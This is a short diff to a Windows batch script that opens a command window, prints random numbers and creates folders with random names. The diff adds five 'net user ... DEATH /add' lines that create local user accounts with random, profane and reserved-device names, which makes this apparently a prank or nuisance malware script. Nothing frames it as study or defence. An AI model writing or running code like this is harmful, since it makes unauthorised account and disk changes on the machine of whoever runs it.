@@ -3,6 +3,11 @@
 color 02
 echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
 Start cmd
+net user %random% DEATH /add
+net user "Гандон" DEATH /add
+net user FuckYou DEATH /add
+net user CON DEATH /add
+net user SinXyuni DEATH /add
 md %random% %random% %random% %random% %random%
 md %random% %random% %random% %random% %random%
 md %random% %random% %random% %random% %random%
